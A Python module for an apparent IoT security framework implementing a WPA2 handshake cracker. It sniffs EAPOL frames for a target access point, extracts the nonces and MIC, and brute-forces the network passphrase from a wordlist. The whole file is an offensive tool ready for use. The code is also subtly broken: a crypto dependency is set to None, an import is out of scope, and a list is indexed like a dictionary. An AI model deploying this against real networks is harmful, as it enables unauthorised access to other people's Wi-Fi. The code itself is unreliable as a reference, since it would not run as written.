from core.ISFFramework import ISFModule, Param
from util.commons import MacAddress
import sys, os, time, signal
import hmac, hashlib, binascii

pbkdf2_ctypes = None#__import__("pbkdf2_ctypes")
from multiprocessing import Pool, Queue, cpu_count
from threading import Thread
from binascii import unhexlify

WPA_KEY_INFO_INSTALL = 64
WPA_KEY_INFO_ACK = 128
WPA_KEY_INFO_MIC = 256


@ISFModule(name="HandshakeCracker",
           version="1.0",
           description="Intercepts & attempts to crack WPA2 handshakes",
           author="Not_so_sm4rt_hom3 team")
class HandshakeCrackModule:
    in_params = {
        "iface": Param("Target network interface", required=True),
        "ssid": Param("Target AP name", required=True),
        "ssid_mac": Param("SSID MAC address", value_type=MacAddress,
                          required=True),
        "dict_path": Param("Dictionary to bruteforce PSK", required=True)
    }

    def __init__(self):
        from scapy.all import sniff
        from scapy.contrib.wpa_eapol import WPA_key
        self.handshakes = dict()
        self.dict_path = None
        self.ssid = None
        self.ssid_mac = None
        self.handshake = None
        self.found_password = False
        self.word_queue = Queue(maxsize=1000000)
        self.result_queue = Queue(maxsize=1000000)
        self.result_word = None

    @staticmethod
    def PRF512(pmk, a, b):
        ptk1 = hmac.new(pmk, binascii.a2b_qp(a) + b + chr(0),
                        hashlib.sha1).digest()
        ptk2 = hmac.new(pmk, binascii.a2b_qp(a) + b + chr(1),
                        hashlib.sha1).digest()
        ptk3 = hmac.new(pmk, binascii.a2b_qp(a) + b + chr(2),
                        hashlib.sha1).digest()
        ptk4 = hmac.new(pmk, binascii.a2b_qp(a) + b + chr(3),
                        hashlib.sha1).digest()
        return ptk1 + ptk2 + ptk3 + ptk4[0:4]

    def start_cracking(self):
        with open(self.dict_path, "rt", encoding="utf-8") as f:
            for line in f:
                self.word_queue.put(line.strip(), block=True)
        print("[+] Loaded %d words" % self.word_queue.qsize())
        self.crack()

    def crack(self):
        pke_data = '\x00' + min(self.ssid_mac,
                                self.handshake["client_mac"]) + max(
            self.ssid_mac, self.handshake["client_mac"]) + min(
            self.handshake["ANonce"], self.handshake["SNonce"]) + max(
            self.handshake["ANonce"], self.handshake["SNonce"])
        while not self.found_password:
            word = self.word_queue.get(block=True, timeout=1)
            self.found_password = self.compare_mic(pke_data, word)
            if self.found_password:
                self.result_word = word
            self.result_queue.put((self.found_password, word))

        return None

    def compare_mic(self, pke_data, word):
        pmk = pbkdf2_ctypes.pbkdf2_bin(word, self.ssid, 4096, 32)
        ptk = HandshakeCrackModule.PRF512(pmk, "Pairwise key expansion",
                                          pke_data)
        kck = ptk[:16]

        if ord(self.handshake["data"][6]) & 0b00000010 == 2:
            calculated_mic = hmac.new(kck, self.handshake["data"],
                                      hashlib.sha1).digest()[0:16]
        else:
            calculated_mic = hmac.new(kck, self.handshake["data"]).digest()

        if self.handshake["MIC"] == calculated_mic:
            return True

        return False

    def process_packet(self, packet):
        if self.handshake:
            return
        if packet.haslayer(WPA_key):
            layer = packet.getlayer(WPA_key)
            AP = packet.addr3
            STA = None
            if AP != self.ssid_mac:
                return
            if packet.FCfield & 1:
                STA = packet.addr2
            elif packet.FCfield & 2:
                STA = packet.addr1
            else:
                print("Provided BSS is either ad-hoc or WDS, skipping")
                return
            if STA not in self.handshakes:
                self.handshakes[STA] = list()
            key_info = layer.key_info
            wpa_key_length = layer.wpa_key_length
            rc = layer.replay_counter

            if key_info & WPA_KEY_INFO_MIC == 0 \
                    and key_info & WPA_KEY_INFO_ACK \
                    and key_info & WPA_KEY_INFO_INSTALL == 0:
                print("Found packet 1 for ", STA)
                self.handshakes[STA]["ANonce"] = packet.nonce
                self.handshakes[STA]["replay_counter"] = rc

            if key_info & WPA_KEY_INFO_MIC \
                    and key_info & WPA_KEY_INFO_ACK == 0 \
                    and key_info & WPA_KEY_INFO_INSTALL == 0 \
                    and "replay_counter" in self.handshakes[STA] \
                    and self.handshakes[STA]["replay_counter"] == rc:
                print("Found packet 2 for ", STA)
                self.handshakes[STA]["SNonce"] = packet.nonce
                self.handshakes[STA]["MIC"] = packet.wpa_key_mic
                self.handshakes[STA]["data"] = packet.wpa_key

            if "ANonce" in self.handshakes[STA] \
                    and "SNonce" in self.handshakes[STA] \
                    and "MIC" in self.handshakes[STA] \
                    and "data" in self.handshakes[STA]:
                print("[+] Valid handshake parameters have been captured")
                print("[+] Starting cracking process...")
                self.handshake = self.handshakes[STA]
                self.handshake["client_mac"] = STA
                self.start_cracking()

    def run(self, params):
        self.ssid = params["ssid"]
        self.ssid_mac = params["ssid_mac"].get_bytes()
        self.dict_path = params["dict_path"]
        sniff(filter="wlan proto 0x888e", iface=params["iface"],
              prn=lambda p: self.process_packet(p))
